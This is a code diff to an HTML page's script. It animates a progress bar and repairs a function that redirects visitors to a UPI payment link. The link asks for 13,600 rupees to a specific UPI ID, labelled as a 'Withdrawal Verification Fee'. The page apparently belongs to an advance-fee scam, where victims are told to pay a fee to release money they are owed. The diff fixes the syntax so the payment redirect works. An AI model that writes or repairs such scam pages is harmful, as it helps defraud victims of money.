@@ -208,23 +208,24 @@
     </div>
   </div>
 
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      const progressBar = document.getElementById('progressBar');
-      let width = 0;
-      const interval = setInterval(() => {
-        if (width >= 100) {
-          clearInterval(interval);
-        } else {
-          width++;
-          progressBar.style.width = width + '%';
-        }
-      }, 30);
-    });function redirectToUPI() {
-  window.location.href =
-    "upi://pay?pa=6005973034@upi&pn=Withdrawal%20Fee&tn=Withdrawal%20Verification%20Fee&am=13,600&cu=INR";
-    }
-    }
-  </script>
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const progressBar = document.getElementById('progressBar');
+    let width = 0;
+    const interval = setInterval(() => {
+      if (width >= 100) {
+        clearInterval(interval);
+      } else {
+        width++;
+        progressBar.style.width = width + '%';
+      }
+    }, 30);
+  });
+
+  function redirectToUPI() {
+    window.location.href =
+      "upi://pay?pa=6005973034@upi&pn=Withdrawal%20Fee&tn=Withdrawal%20Verification%20Fee&am=13600&cu=INR";
+  }
+</script>
 </body>
 </html>
